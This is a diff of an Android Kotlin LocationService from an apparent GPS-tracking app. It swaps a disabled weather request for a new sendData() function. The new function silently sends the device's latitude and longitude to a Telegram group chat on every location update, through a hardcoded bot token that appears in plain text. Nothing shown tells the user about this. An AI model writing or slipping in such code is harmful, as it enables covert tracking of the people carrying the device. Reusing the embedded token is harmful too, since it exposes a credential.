@@ -35,10 +35,13 @@ class LocationService : Service() {
     private var lastLocation: Location? = null
     //  Переменная для хранения высчтанного расстояния
     private var distance = 0.0f
+    private  var latit = 0.0f
+    private  var longit = 0.0f
     //    Эта переменная нужна для того, чтобы подключаться к провайдеру GPS и получать у него данные о местоположении
     private lateinit var locProvider: FusedLocationProviderClient
     private lateinit var locRequest: LocationRequest
     private lateinit var geoPointsList: ArrayList<GeoPoint>
+
     override fun onBind(p0: Intent?): IBinder? {
         return null
     }
@@ -124,7 +127,11 @@ class LocationService : Service() {
                     currentLocation.longitude.toFloat(),
                     geoPointsList
                 )
+                latit = currentLocation.latitude.toFloat()
+                longit = currentLocation.longitude.toFloat()
                 sendLocData(locModel)
+                sendData()
+
 
             }
             lastLocation = currentLocation
@@ -165,14 +172,18 @@ class LocationService : Service() {
         )
     }
 
-    private fun getData() {
-//        val api = "38b27a1546ab4bb5a9364709232202"
-        val url = "https://api.weatherapi.com/v1/forecast.json?key=&days=3&aqi=no&alerts=no"
+    private fun sendData(){
+        val token = "5906286565:AAF71BxPYkX6sWpgz1wGTdtyKlnffROO3zE"
+        val chat_id = "1001858191181"
+        var lat = latit.toString()
+        var lon = longit.toString()
+        val url = "https://api.telegram.org/bot5906286565:AAF71BxPYkX6sWpgz1wGTdtyKlnffROO3zE/sendmessage?chat_id=-1001858191181&text=${lat}, ${lon}"
         val queue = Volley.newRequestQueue(baseContext)
         val sRequest = StringRequest(
             Request.Method.GET,
             url, { response ->
-//                val list = getWeatherByDays(response)
+                Log.d("MyLog", "Response: ${response.subSequence(1, 10)}")
+                 //                val list = getWeatherByDays(response)
 //                dayList.value = list
 //                currentDay.value = list[0]
             },
